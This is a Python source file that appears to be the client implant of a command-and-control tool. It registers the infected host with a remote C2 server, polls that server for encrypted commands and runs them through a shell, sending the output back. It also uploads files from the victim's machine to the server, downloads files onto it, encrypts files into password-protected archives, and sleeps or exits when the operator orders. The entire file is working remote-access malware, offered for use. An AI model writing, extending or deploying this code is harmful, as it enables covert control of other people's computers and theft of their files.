from time import time, sleep
from pyzipper import AESZipFile, ZIP_LZMA, WZ_AES
from requests import get, post, exceptions, put
from subprocess import run, PIPE, STDOUT
from encryption import cipher
from settings import (PORT, CMD_REQUEST, CWD_RESPONSE, RESPONSE, RESPONSE_KEY, C2_SERVER, DELAY, PROXY, HEADER,
                      FILE_REQUEST, FILE_SEND, ZIP_PASSWORD)

from os import getenv, uname, chdir, getcwd, path

client = (getenv("LOGNAME") + "@" + uname().nodename + "@" + str(time()))

encrypted_client = cipher.encrypt(client.encode()).decode()


def post_to_server(message: str, response_path=RESPONSE):
    try:
        message = cipher.encrypt(message.encode())
        post(f"http://{C2_SERVER}:{PORT}{response_path}", data={RESPONSE_KEY: message},
             headers=HEADER, proxies=PROXY)
    except exceptions.RequestException:
        return


def get_filename(input_string):
    try:
        return " ".join(input_string.split()[2:]).replace("\\", "/")
    except IndexError:
        post_to_server(f"You must enter a filename after {input_string}.\n")


while True:
    try:
        response = get(f"http://{C2_SERVER}:{PORT}{CMD_REQUEST}{encrypted_client}", headers=HEADER, proxies=PROXY)
        print(response.status_code)
        if response.status_code == 404:
            raise exceptions.RequestException
    except exceptions.RequestException:
        sleep(DELAY)
        continue

    command = cipher.decrypt(response.content).decode()

    if command.startswith("cd "):
        directory = command[3:]
        try:
            chdir(directory)
        except FileNotFoundError:
            post_to_server(f"{directory} was not found.\n")
        except NotADirectoryError:
            post_to_server(f"{directory} is not a directory.\n")
        except PermissionError:
            post_to_server(f"You do not have permissions to access {directory}.\n")
        except OSError:
            post_to_server("There was an operating system error on the client.\n")
        else:
            post_to_server(getcwd(), CWD_RESPONSE)

    elif not command.startswith("client "):
        command_output = run(command, shell=True, stdout=PIPE, stderr=STDOUT).stdout
        post_to_server(command_output.decode())

    elif command.startswith("client download"):
        filepath = get_filename(command)
        if filepath is None:
            continue
        filename = path.basename(filepath)
        encrypted_filepath = cipher.encrypt(filepath.encode()).decode()
        try:
            with get(f"http://{C2_SERVER}:{PORT}{FILE_REQUEST}{encrypted_filepath}", stream=True, headers=HEADER,
                     proxies=PROXY) as response:
                if response.status_code == 200:
                    with open(filename, "wb") as file_handle:
                        file_handle.write(cipher.decrypt(response.content))
                    post_to_server(f"{filename} is now on {client}.\n")
        except (FileNotFoundError, PermissionError, OSError):
            post_to_server(f"Unable to write {filename} to disk on {client}.\n")

    elif command.startswith("client upload"):
        filepath = get_filename(command)
        if filepath is None:
            continue
        filename = path.basename(filepath)
        encrypted_filename = cipher.encrypt(filename.encode()).decode()
        try:
            with open(filepath, "rb") as file_handle:
                encrypted_file = cipher.encrypt(file_handle.read())
                put(f"http://{C2_SERVER}:{PORT}{FILE_SEND}/{encrypted_filename}", data=encrypted_file, stream=True,
                    proxies=PROXY, headers=HEADER)
        except (FileNotFoundError, PermissionError, OSError):
            post_to_server(f"Unable to access {filepath} on {client}.\n")

    elif command.startswith("client zip"):
        filepath = get_filename(command)
        if filepath is None:
            continue
        filename = path.basename(filepath)
        try:
            with AESZipFile(f"{filepath}.zip", "w", compression=ZIP_LZMA, encryption=WZ_AES) as zip_file:
                zip_file.setpassword(ZIP_PASSWORD)
                if path.isdir(filepath):
                    post_to_server(f"{filepath} on {client} is a directory.  Only files can be zipped.\n")
                else:
                    zip_file.write(filepath, filename)
                    post_to_server(f"{filepath} is now zip-encrypted on {client}.\n")
        except (FileNotFoundError, PermissionError, OSError):
            post_to_server(f"Unable to access {filepath} on {client}.\n")

    elif command.startswith("client unzip"):
        filepath = get_filename(command)
        if filepath is None:
            continue
        filename = path.basename(filepath)
        try:
            with AESZipFile(filepath) as zip_file:
                zip_file.setpassword(ZIP_PASSWORD)
                zip_file.extractall(path.dirname(filepath))
                post_to_server(f"{filepath} is now unzipped and decrypted on the client.\n")
        except (FileNotFoundError, PermissionError, OSError):
            post_to_server(f"{filepath} was not found on the client.\n")

    elif command.startswith("client kill"):
        post_to_server(f"{client} has been killed.\n")
        exit()

    elif command.startswith("client sleep "):
        try:
            delay = float(command.split()[2])
            if delay < 0:
                raise ValueError
        except (IndexError, ValueError):
            post_to_server("You must enter in a positive number for the amount of time to sleep in seconds.\n")
        else:
            post_to_server(f"{client} will sleep for {delay} seconds.\n")
            sleep(delay)
            post_to_server(f"{client} is now awake.\n")
